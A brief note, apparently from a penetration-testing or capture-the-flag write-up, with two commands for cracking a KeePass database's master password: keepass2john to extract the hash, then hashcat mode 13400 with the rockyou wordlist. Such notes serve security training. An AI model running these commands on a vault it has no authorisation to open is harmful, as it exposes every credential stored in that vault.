> After obtaining the database.kdbx file:

```
keepass2john Database.kdbx > keepass.hash
```

**NOTE**: Make sure to remove the database word from the hash file otherwise hashcat will not accept it.

> Crack the hash:

```
sudo hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

